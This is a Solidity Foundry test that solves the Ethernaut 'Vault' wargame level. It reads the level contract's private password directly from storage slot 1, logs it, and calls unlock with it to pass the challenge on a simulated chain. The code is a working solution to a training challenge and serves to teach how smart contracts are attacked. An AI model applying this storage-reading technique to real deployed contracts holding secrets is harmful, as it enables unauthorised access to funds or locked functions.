pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/08_Vault/VaultFactory.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract VaultTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault ethernautVault = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
 

        // load contract storage at specific slot
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(password)); 

        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
        emit log_string(string(abi.encodePacked(password)));

        // Call the unlock function with the password we read from storage
        ethernautVault.unlock(password);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
